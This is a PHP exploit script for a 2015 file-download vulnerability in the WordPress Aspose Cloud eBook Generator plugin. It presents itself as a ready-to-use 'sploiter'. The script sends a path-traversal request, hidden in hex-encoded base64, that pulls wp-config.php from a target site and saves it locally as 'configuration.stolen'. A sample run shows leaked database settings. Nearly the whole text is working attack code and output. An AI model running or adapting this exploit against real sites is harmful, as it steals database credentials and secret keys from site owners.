<?php
/**
Vulnerability: WordPress Aspose Cloud eBook Generator File Download Vulnerability
Disclosure Date: 28-03-2015
Exploit Author: Munir Njiru (alienwithin)
Disclosed By: Ashiyane Digital Security Team 
Vendor Homepage : https://wordpress.org/plugins/aspose-cloud-ebook-generator/
Site: http://munir.skilledsoft.com

Exploit Description: Constructs a payload to force download of the wordpress configuration file from the server to perform further a    ttacks

Test Environment Used: Windows,Linux
C:\scripter>php wp-ebook-gen-FDV.php poc.google.com/corporate_blog


Attempting to steal Wordpress Configuration From Server, be patient:

Full Config Downloaded to current Directory with Filename:

"<<configuration.stolen>>"

C:\scripter>more configuration.stolen
<?php
/**
* The base configurations of the WordPress.
*
* This file has the following configurations: MySQL settings, Table Prefix,
* Secret Keys, and ABSPATH. You can find more information by visiting
* {@link http://codex.wordpress.org/Editing_wp-config.php Editing wp-config.php
}
* Codex page. You can get the MySQL settings from your web host.
*
* This file is used by the wp-config.php creation script during the
* installation. You don't have to use the web site, you can just copy this file
* to "wp-config.php" and fill in the values.
*
* @package WordPress
*/

// ** MySQL settings - You can get this info from your web host ** //
/** The name of the database for WordPress */
//define('DB_NAME', 'wp_corporate');

/** MySQL database username */
//define('DB_USER', 'root');
//############################# Truncated ##################

error_reporting(0);
$script = $argv[0];
$target = $argv[1];

$myStealer = hireAThief();

$headers = array(
    'Accept: */*',
    'User-Agent: Alienwithin/4.0 (compatible; MSIE 6.0; HackintoshTuxu 4.0; .NET CLR 1.1.4322)',
    'Accept-Language: en-US,en;q=0.5',
    'Connection: keep-alive',
    'Pragma: no-cache',
    'Cache-Control: no-cache'
);
function banner()
{
    echo "\n\n##############################################################################\n";
    echo "\nWordPress Aspose Cloud eBook Generator File Download Vulnerability Sploiter \n\n";
    echo "Author: Alienwithin \n\n";
    echo "Site: http://munir.skilledsoft.com \n\n";
    echo "Usage: php wp-ebook-gen-FDV.php target_host \n\n";
    echo "Example: php wp-ebook-gen-FDV.php myvulnerabletarget.com\n\n";
    echo "##############################################################################\n\n";
}

if ($target == "") {
    banner();
} else {
    $perform_Theft = curl_init();
    curl_setopt_array($perform_Theft, array(
        CURLOPT_CUSTOMREQUEST => "GET",
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_BINARYTRANSFER => true,
        CURLOPT_URL => 'http://' . $target . $myStealer,
        CURLOPT_HTTPHEADER => $headers,
        CURLOPT_HEADER => False
    ));
    $result = curl_exec($perform_Theft);
    echo banner() . "\n\nAttempting to steal Wordpress Configuration From Server, be patient: \n\n";
    if (!curl_exec($perform_Theft)) {
        die('Error: "' . curl_error($perform_Theft) . '" - Code: ' . curl_errno($perform_Theft));
    }
    
    
    $config_heisted = "configuration.stolen";
    file_put_contents($config_heisted, $result, FILE_APPEND, $context = null);
    
    echo "Full Config Downloaded to current Directory with Filename:\n\n\t\t \"<<configuration.stolen>>\"\n\n";
}




function hireAThief()
{
    $Negotiate_terms_with_robber = "\x4c\x33\x64\x77\x4c\x57\x4e\x76\x62\x6e\x52\x6c\x62\x6e\x51\x76\x63\x47\x78\x31\x5a\x32\x6c\x75\x63\x79\x39\x68\x63\x33\x42\x76\x63\x32\x55\x74\x59\x32\x78\x76\x64\x57\x51\x74\x5a\x57\x4a\x76\x62\x32\x73\x74\x5a\x32\x56\x75\x5a\x58\x4a\x68\x64\x47\x39\x79\x4c\x32\x46\x7a\x63\x47\x39\x7a\x5a\x56\x39\x77\x62\x33\x4e\x30\x63\x31\x39\x6c\x65\x48\x42\x76\x63\x6e\x52\x6c\x63\x6c\x39\x6b\x62\x33\x64\x75\x62\x47\x39\x68\x5a\x43\x35\x77\x61\x48\x41\x2f\x5a\x6d\x6c\x73\x5a\x54\x30\x75\x4c\x69\x38\x75\x4c\x69\x38\x75\x4c\x69\x39\x33\x63\x43\x31\x6a\x62\x32\x35\x6d\x61\x57\x63\x75\x63\x47\x68\x77";
    $agree_on_heist_job          = base64_decode($Negotiate_terms_with_robber);
    return $agree_on_heist_job;
}


?>
